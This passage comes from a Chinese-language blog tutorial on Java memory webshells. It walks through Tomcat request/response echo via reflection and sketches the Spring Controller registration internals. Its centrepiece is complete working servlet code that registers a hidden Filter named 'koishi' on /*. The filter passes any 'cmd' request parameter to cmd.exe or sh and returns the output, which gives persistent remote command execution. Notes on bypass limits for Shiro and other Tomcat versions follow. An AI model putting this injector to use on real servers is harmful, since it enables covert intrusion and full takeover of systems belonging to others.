 writer.flush();</span><br><span class="line">                            writer.write(<span class="string">&quot;TomcatEcho789&quot;</span>);</span><br><span class="line">                            flag=<span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object obj,String fieldName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=<span class="literal">null</span>;</span><br><span class="line">        Class clas=obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clas!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                field=clas.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">                clas=clas.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field!=<span class="literal">null</span>)&#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(obj);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="半通用回显"><a href="#半通用回显" class="headerlink" title="半通用回显"></a>半通用回显</h3><p>根据前文思路顺着堆栈一路向下查看Request和Response存储位置，只要获取到一个实例即可。</p>
<p>顺着思路，在<code>org.apache.catalina.core.ApplicationFilterChain</code>位置发现符合条件的变量。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br></pre></td></tr></table></figure></div>

<p><strong>ApplicationFilterChain#internalDoFilter 赋值</strong> </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; <span class="comment">// 设置为true</span></span><br><span class="line">    lastServicedRequest.set((Object)<span class="literal">null</span>);</span><br><span class="line">    lastServicedResponse.set((Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>添加思路:</strong></p>
<blockquote>
<ul>
<li><p>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，让代码逻辑走到if条件里面</p>
</li>
<li><p>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p>
</li>
<li><p>从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p>
</li>
</ul>
</blockquote>
<h4 id="tomcat半通用回显马"><a href="#tomcat半通用回显马" class="headerlink" title="tomcat半通用回显马"></a>tomcat半通用回显马</h4><p>（我看这哥们在tomcat半回显的基础上加上了恶意构造的Filter，通过前面对Filter的学习，这里还是好理解）</p>
<p><strong>半通用回显：</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_Half</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//修改final</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>搭配filter</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/halfDemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_Half_WithFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//修改final</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> requestThreadLocal.get();</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();  <span class="comment">//这里实际获取到的是ApplicationContextFacade</span></span><br><span class="line">            <span class="keyword">if</span> (servletContext!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//编写恶意Filter</span></span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">ShellIntInject</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;start with cmd=&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(cmdParamName);</span><br><span class="line">                        <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                            String[] cmds = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line">                            writer.close();</span><br><span class="line">                        &#125;</span><br><span class="line">                        filterChain.doFilter(request, response);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//获取ApplicationContext</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(servletContext);</span><br><span class="line">                <span class="comment">//获取standardContext</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(ApplicationContext);</span><br><span class="line">                <span class="comment">//获取LifecycleBase的state修改为org.apache.catalina.LifecycleState.STARTING_PREP</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">state</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                state.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                <span class="comment">//注册filterName</span></span><br><span class="line">                FilterRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> ApplicationContext.addFilter(filterName, <span class="keyword">new</span> <span class="title class_">ShellIntInject</span>());</span><br><span class="line">                <span class="comment">//添加拦截路径，实现是将存储写入到filterMap中</span></span><br><span class="line">                registration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line">                <span class="comment">//调用filterStart方法将filterconfig进行添加</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">filterStart</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStart.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filterStart.invoke(standardContext,<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//移动filter为位置到前面</span></span><br><span class="line">                FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                        filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                        filterMaps[<span class="number">0</span>] = filterMap;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="string">&quot;TomcatEcho_HalfWithFilter injection successful!\nGo to /koishi with ParamName \&quot;cmd\&quot; for farther operation&quot;</span>);</span><br><span class="line">                state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p><strong>shiro</strong></p>
<blockquote>
<p>在shiro反序列化漏洞的利用中并不能成功，发现request，response的设置是在漏洞触发点之后，所以在触发漏洞执行任意java代码时获取不到我们想要的response。其原因是因为rememberMe功能的实现是使用了自己实现的filter。</p>
</blockquote>
<p><strong>Tomcat10</strong></p>
<p>HttpServletRequest 与 tomcat789 调用的依赖不同</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jakarta.servlet.*;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br></pre></td></tr></table></figure></div>



<p><strong>Tomcat7</strong></p>
<p>FilterDef 与 FilterMap 在 tomcat8910 中调用依赖不同</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.apache.tomcat.util.descriptor.web.FilterDef</span><br><span class="line">org.apache.tomcat.util.descriptor.web.FilterMap</span><br></pre></td></tr></table></figure></div>



<h2 id="六、Spring-Controller-内存马"><a href="#六、Spring-Controller-内存马" class="headerlink" title="六、Spring Controller 内存马"></a>六、Spring Controller 内存马</h2><p><a class="link"   href="https://github.com/wycm/SpringMVC-Demo/blob/master/SpringMVC%E6%BA%90%E7%A0%81%E4%B9%8BController%E6%9F%A5%E6%89%BE%E5%8E%9F%E7%90%86.md" >SpringMVC 部分讲解 和 registerHandlerMethod方法简单总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="SpringMVC初始化过程"><a href="#SpringMVC初始化过程" class="headerlink" title="SpringMVC初始化过程"></a><strong>SpringMVC初始化过程</strong></h3><p>跟着文章思路，自己debug进去看，大概写个流程</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingHandlerMapping#afterPropertiesSet -&gt; </span><br><span class="line">AbstractHandlerMethodMapping#afterPropertiesSet -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#initHandlerMethods -&gt;</span><br><span class="line"><span class="comment">// 从applicationContext中扫描beans，然后从bean中查找并注册处理器方法</span></span><br><span class="line">AbstractHandlerMethodMapping#processCandidateBean -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#isHandler -&gt;</span><br><span class="line"><span class="comment">// isHandler会根据bean来判断bean定义中是否带有Controller注解或RequestMapping注解</span></span><br><span class="line">AbstractHandlerMethodMapping#detectHandlerMethods -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#getMappingForMethod -&gt;</span><br><span class="line"><span class="comment">// 根据handler method方法创建RequestMappingInfo对象</span></span><br><span class="line">AbstractHandlerMethodMapping#registerHandlerMethod -&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong><code>registerHandlerMethod</code>方法简单总结</strong></p>
<blockquote>
<ol>
<li>检查<code>RequestMapping</code>注解配置是否有歧义。</li>
<li>构建<code>RequestMappingInfo</code>到<code>HandlerMethod</code>的映射map。该map便是<code>AbstractHandlerMethodMapping</code>的成员变量<code>handlerMethods</code>。<code>LinkedHashMap``&lt;RequestMappingInfo,HandlerMethod&gt;</code></li>
<li>构建<code>AbstractHandlerMethodMapping</code>的成员变量<code>urlMap</code>，<code>MultiValueMap</code>&lt;<code>String</code>,<code>RequestMappingInfo</code>&gt;。这个数据结构可以把它理解成Map&lt;String,List&gt;。其中String类型的key存放的是处理方法上<code>RequestMapping</code>注解的value。就是具体的<code>uri</code> 先有如下<code>Controller</code></li>
</ol>
</blockquote>
<h3 id="查找过程"><a href="#查找过程" class="headerlink" title="查找过程"></a>查找过程</h3><blockquote>
<p>web容器（Tomcat、jetty）接收请求后，交给DispatcherServlet处理。FrameworkServlet调用对应请求方法（eg:get调用doGet），然后调用processRequest方法。进入processRequest方法后，一系列处理后，在line:936进入doService方法。然后在Line856进入doDispatch方法。在line:896获取当前请求的处理器handler。然后进入AbstractHandlerMethodMapping的lookupHandlerMethod方法。代码如下</p>
</blockquote>
<p><strong>lookupHandlerMethod</strong></p>
<ul>
<li><p>根据lookupPath，也就是请求的uri。直接查找urlMap，获取直接匹配的RequestMappingInfo list</p>
</li>
<li><p>代码里可以看出，匹配的先后顺序是value&gt;params&gt;headers&gt;consumes&gt;produces&gt;methods&gt;custom</p>
</li>
<li><p>当通过urlMap获取不到直接匹配value的RequestMappingInfo时才会走通配符匹配进入addMatchingMappings方法。</p>
</li>
<li><p>在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos</p>
</li>
<li><p>如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos</p>
</li>
<li><p>获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod</p>
</li>
</ul>
<h3 id="Controller-注册进一步学习"><a href="#Controller-注册进一步学习" class="headerlink" title="Controller 注册进一步学习"></a>Controller 注册进一步学习</h3><p><a class="link"   href="https://landgrey.me/blog/12/" >LandGrey’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>综上，可以了解到：每个具体的 <code>DispatcherServlet</code> 创建的是一个 <code>Child Context</code>，代表一个独立的 <code>IoC 容器</code>；而 <code>ContextLoaderListener</code> 所创建的是一个 <code>Root Context</code>，代表全局唯一的一个公共 <code>IoC 容器</code></p>
<p>如果要访问和操作 <code>bean</code> ，一般要获得当前代码执行环境的<code>IoC 容器</code> 代表者 <code>ApplicationContext</code></p>
</blockquote>
<p><strong>技术实现：</strong></p>
<h4 id="1-获得当前代码运行时的上下文环境"><a href="#1-获得当前代码运行时的上下文环境" class="headerlink" title="1.获得当前代码运行时的上下文环境"></a>1.获得当前代码运行时的上下文环境</h4><p>方法一：<code>getCurrentWebApplicationContext</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure></div>



<p>方法二：<code>WebApplicationContextUtils</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure></div>



<p>方法三：<code>RequestContextUtils</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure></div>



<p>方法四：<code>getAttribute</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></pre></td></tr></table></figure></div>

<p><strong>而对于获取上下文来说，推荐使用第三、四种方法。前两种可能会获取不到<code>RequestMappingHandlerMapping</code>实例</strong></p>
<h4 id="2-手动注册-controller"><a href="#2-手动注册-controller" class="headerlink" title="2.手动注册 controller"></a>2.手动注册 controller</h4><p>Spring 2.5 开始到 Spring 3.1 之前一般使用 <code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code> 映射器 ；</p>
<p>Spring 3.1 开始及以后一般开始使用新的 <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持<code>@Contoller</code>和<code>@RequestMapping</code>注解。</p>
<p>当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 <code>bean</code>。又因版本不同和较多的接口等原因，手工注册动态 <code>controller</code> 的方法不止一种。</p>
